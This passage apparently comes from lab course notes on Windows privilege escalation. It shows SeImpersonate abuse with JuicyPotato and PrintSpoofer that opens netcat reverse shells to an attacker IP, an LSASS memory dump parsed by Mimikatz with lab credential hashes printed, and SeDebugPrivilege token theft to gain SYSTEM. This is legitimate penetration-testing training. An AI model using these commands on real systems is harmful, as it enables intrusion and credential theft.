        SYNCHRONIZE
        READ_CONTROL
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

# Windows Privileges Overview

If we run an elevated command window, we can see the complete listing of rights available to us:

```powershell
PS C:\htb> whoami 

winlpe-srv01\administrator


PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
```

When a privilege is listed for our account in the `Disabled` state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled.

A standard user, in contrast, has drastically fewer rights.

```powershell
PS C:\htb> whoami 

winlpe-srv01\htb-student


PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

User rights increase based on the groups they are placed in or their assigned privileges. Below is an example of the rights granted to users in the `Backup Operators` group. Users in this group do have other rights that UAC currently restricts.

Still, we can see from this command that they have the [SeShutdownPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system), which means that they can shut down a domain controller that could cause a massive service interruption should they log onto a domain controller locally (not via RDP or WinRM).

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

# SeImpersonate and SeAssignPrimaryToken

Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space. 

Attackers often abuse this privilege in the "Potato style" privescs - where a service account can `SeImpersonate`, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.

## SeImpersonate Example - JuicyPotato

Client connections to IIS and SQL Server may be configured to use Windows Authentication. The server may then need to access other resources such as file shares as the connecting client. It can be done by impersonating the user whose context the client connection is established. To do so, the service account will be granted the [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) privilege.

In this scenario, the SQL Service service account is running in the context of the default `mssqlserver` account. Imagine we have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.

## MSSQLClient.py

```bash
$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL>
```

## Enabling xp_cmdshell

```bash
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```


## Checking Account Privileges

```bash
> xp_cmdshell whoami
output
-----------------------------
nt service\mssql$sqlexpress01

```

```bash
> xp_cmdshell whoami /priv
output
--------------------------------------------------------------------------------
NULL
PRIVILEGES INFORMATION
----------------------
NULL
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

The command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed. This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.

## Escalating Privileges Using JuicyPotato

To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call. 

Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.

```shell
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.16.8 8443 -e cmd.exe" -t *
```

## Catch the Shell

```bash
❯ nc -nvlp 8443
Listening on 0.0.0.0 8443
Connection received on 10.129.43.43 49698
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Escalating Privileges using PrintSpoofer

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.

```bash
dbo@master)> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.16.8 8443 -e cmd"
output
-------------------------------------------
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```
---

# SeDebugPrivilege

To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`.

A user may not be a local admin on a host but have rights that we cannot enumerate remotely using a tool such as BloodHound. This would be worth checking in an environment where we obtain credentials for several users and have RDP access to one or more hosts but no additional privileges.

```powershell
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set     
```

We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.

```powershell
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally.

```powershell
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP> 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

<SNIP>
```

## Remote Code Execution as SYSTEM

We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly

First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`.

First, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the `jordan` user). Next, type `tasklist` to get a listing of running processes and accompanying PIDs.

```powershell
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   636 Console                    1     10,408 K
```

```powershell
PS C:\Tools> ImpersonateFromParentPid -ppid 636 -command cmd.exe
[+] Got Handle for ppid: 636
[+] Updated proc attribute list
[+] Starting cmd.exe ...True - pid: 4920 - Last error: 122
PS C:\Tools>
```